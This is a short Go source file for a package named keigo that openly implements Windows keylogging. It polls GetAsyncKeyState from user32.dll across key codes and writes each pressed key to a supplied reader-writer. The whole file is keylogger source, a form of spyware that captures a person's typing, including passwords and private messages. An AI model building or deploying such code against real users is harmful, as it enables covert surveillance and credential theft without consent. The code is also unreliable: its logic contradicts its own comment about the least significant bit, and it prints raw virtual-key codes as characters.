// Package keigo implements windows keylogging functions.
package keigo

import (
	"fmt"
	"io"
	"syscall"
)

// Load native windows dll.
var moduser32 = syscall.NewLazyDLL("user32.dll")

// Load getAsyncKeyState function from dll.
var procGetAsyncKeyState = moduser32.NewProc("GetAsyncKeyState")

// KeyLog takes a readWriter and writes the logged characters.
func KeyLog(rw io.ReadWriter) (err error) {
	// Query key mapped to integer `0x00` to `0xFF` if it's pressed.
	for i := 0; i < 0xFF; i++ {
		asynch, _, _ := syscall.Syscall(procGetAsyncKeyState.Addr(), 1, uintptr(i), 0, 0)

		// If the least significant bit is set ignore it.
		//
		// As it's written in the documentation:
		// `if the least significant bit is set, the key was pressed after the previous call to GetAsyncKeyState.`
		// Which we don't care about :)
		if asynch&0x1 == 0 {
			continue
		}

		// Write i to rw.
		err = writeKey(i, rw)

		if err != nil {
			return err
		}
	}

	return nil
}

// writeKey writes a character to a ReadWriter.
func writeKey(i int, rw io.ReadWriter) (err error) {
	_, err = fmt.Fprintf(rw, "%c", i)
	if err != nil {
		return err
	}

	return nil
}
